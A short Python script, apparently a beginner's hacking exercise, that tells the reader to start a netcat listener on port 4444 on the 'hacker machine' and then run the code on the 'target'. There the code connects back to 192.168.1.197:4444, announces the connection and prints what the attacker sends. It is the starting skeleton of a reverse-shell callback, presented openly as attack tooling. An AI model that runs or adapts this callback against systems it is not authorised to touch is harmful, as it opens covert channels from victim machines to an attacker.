#!/usr/bin/env python3
'''
Do this on hacker machine:

nc -vv -l -p 4444
netcat verbose listen port 4444


Run this code on the target:

'''
import socket

# create a socket object
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connect 
connection.connect(("192.168.1.197", 4444))

connection.send("\n[INFO] Connection Established\n".encode("utf-8"))

recv_data = connection.recv(1024).decode("utf-8")

print(recv_data)

connection.close()




